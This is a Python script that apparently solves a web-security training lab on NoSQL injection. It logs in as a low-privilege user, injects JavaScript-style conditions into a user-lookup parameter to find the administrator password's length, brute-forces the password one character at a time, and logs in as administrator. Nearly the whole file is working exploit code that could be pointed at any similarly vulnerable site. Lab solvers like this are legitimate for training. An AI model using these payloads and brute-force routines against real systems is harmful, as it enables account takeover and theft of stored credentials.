import requests
import re
from colorama import Fore

LAB_NAME = "Exploiting NoSQL injection to extract data"


def run(url, payload=None, proxies=None):
    url = url.rstrip("/")

    print(Fore.YELLOW + "Steps to solve the lab:")
    print(Fore.WHITE + "1. Fetch login page")
    print(Fore.WHITE + "2. Extract CSRF token and session")
    print(Fore.WHITE + "3. Login as wiener")
    print(Fore.WHITE + "4. Find admin password length via NoSQL injection")
    print(Fore.WHITE + "5. Brute force the password character-by-character")
    print(Fore.WHITE + "6. Login as administrator")
    print(Fore.WHITE + f"7. Fetch admin profile\n")

    print("[+] Injection parameter: " + Fore.YELLOW + "user")

    # Step 1 - Fetch login page
    print("[1] Fetching the login page")
    login_page = requests.get(
        f"{url}/login", verify=False, proxies=proxies, allow_redirects=False)
    session = login_page.cookies.get("session")

    csrf_token = extract_csrf(login_page.text)
    if not csrf_token:
        print(Fore.RED + "[!] CSRF token not found.")
        return False

    # Step 2 - Login as wiener
    print("[2] Login as wiener")
    data = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    cookies = {"session": session}
    login_resp = requests.post(f"{url}/login", data=data, cookies=cookies,
                               proxies=proxies, allow_redirects=False, verify=False)
    wiener_session = login_resp.cookies.get("session")

    # Step 3 - Determine password length
    print("[3] Determine password length")
    length = get_password_length(url, wiener_session, proxies)
    print(length)

    # Step 4 - Brute force password
    print("[4] Brute force password")
    admin_password = brute_force_password(url, wiener_session, length, proxies)
    print(admin_password)

    # Step 5 - Login as admin
    print("[5] Login as admin")
    login_page = requests.get(
        f"{url}/login", proxies=proxies, allow_redirects=False)
    session = login_page.cookies.get("session")
    csrf_token = extract_csrf(login_page.text)

    data = {"username": "administrator",
            "password": admin_password, "csrf": csrf_token}
    cookies = {"session": session}
    login_resp = requests.post(
        f"{url}/login", data=data, cookies=cookies, proxies=proxies, allow_redirects=False)

    # Step 6 - Fetch admin profile
    print("[6] Fetch admin profile")
    admin_session = login_resp.cookies.get("session")
    cookies = {"session": admin_session}
    profile = requests.get(
        f"{url}/my-account", cookies=cookies, proxies=proxies, allow_redirects=False)

    if profile.status_code == 200:
        print(Fore.GREEN + "[+] Lab solved successfully!")
        return True
    else:
        print(Fore.RED + "[!] Final step failed, status:", profile.status_code)
        return False


def extract_csrf(html):
    matches = re.findall(r'name=["\']csrf["\'].*value=["\'](.+?)["\']', html)
    return matches[0] if matches else None


def get_password_length(url, session_cookie, proxies):
    for length in range(1, 50):
        payload = f"administrator' %26%26 this.password.length == {length} || '"
        cookies = {"session": session_cookie}
        r = requests.get(f"{url}/user/lookup?user={payload}",
                         cookies=cookies, proxies=proxies, allow_redirects=False)
        if "Could not find user" not in r.text:
            return length
    raise Exception("Password length not found")


def brute_force_password(url, session_cookie, length, proxies):
    found = []
    for pos in range(length):
        for c in "abcdefghijklmnopqrstuvwxyz":
            payload = f"administrator' %26%26 this.password[{pos}] == '{c}' || '"
            cookies = {"session": session_cookie}
            r = requests.get(f"{url}/user/lookup?user={payload}",
                             cookies=cookies, proxies=proxies, allow_redirects=False)
            if "Could not find user" not in r.text:
                found.append(c)
                break
    return "".join(found)
